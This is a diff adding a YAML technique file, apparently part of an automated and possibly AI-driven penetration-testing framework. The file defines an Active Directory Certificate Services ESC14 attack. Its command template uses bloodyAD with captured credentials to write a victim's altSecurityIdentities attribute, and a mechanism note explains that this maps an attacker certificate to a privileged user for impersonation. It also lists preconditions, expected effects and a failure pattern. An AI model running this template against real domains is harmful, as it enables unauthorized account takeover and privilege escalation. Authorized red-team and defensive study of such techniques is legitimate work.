@@ -1,0 +1,36 @@
+name: adcs_esc14
+category: ad
+description: ADCS ESC14 — WriteProperty on altSecurityIdentities enables cert hijack
+preconditions:
+- has_cred
+- write_access_altsecid
+- service.port==445
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+  victim: from_engagement.victim_user
+  attacker_cert_issuer: from_engagement.attacker_cert_issuer
+command_template: bloodyAD -u {username} -p '{password}' -d {domain} --host {target_ip}
+  add altSecurityIdentities '{victim}' 'X509:<I>{attacker_cert_issuer}<S>CN={username}'
+parser: generic_parser
+expected_effects:
+- cert_alt_identity_set
+- victim_auth_as_attacker_cert
+falsifier:
+  pattern: ACCESS_DENIED|insufficient rights|CONSTRAINT_VIOLATION
+  timeout: 60
+model_tier: sonnet
+mechanism: 'altSecurityIdentities maps a certificate issuer/subject to the target
+  principal
+
+  for explicit Schannel/PKINIT mapping. If you can write it on a privileged user,
+
+  make your own cert map to them → PKINIT/Schannel auth as that user.
+
+  '
+references:
+  ocd_mindmap: 'Branch 7: ADCS ESC14 (altSecurityIdentities write)'
+  hacktricks: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
